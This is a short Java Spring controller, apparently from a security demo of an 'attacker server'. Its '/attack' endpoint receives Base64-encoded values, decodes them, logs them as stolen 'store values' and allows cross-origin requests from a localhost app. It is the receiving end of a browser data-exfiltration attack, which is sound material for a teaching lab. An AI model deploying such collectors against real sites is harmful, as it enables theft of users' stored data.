package com.example.attackerserver;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletResponse;
import java.util.Base64;

import static java.nio.charset.StandardCharsets.UTF_8;

@RestController
public class DataRestController {

    private static final Logger log = LoggerFactory.getLogger(DataRestController.class);

    @GetMapping(
            path = "/attack",
            produces = MediaType.APPLICATION_JSON_VALUE)
    public String data(@RequestParam("value") String value, HttpServletResponse response) {
        log.info("Base64 value={}", value);
        String decodedValue = new String(Base64.getDecoder().decode(value), UTF_8);
        log.info("Decoded store values={}", decodedValue);
        response.addHeader("access-control-allow-origin", "http://localhost:8080");
        return decodedValue;
    }

}
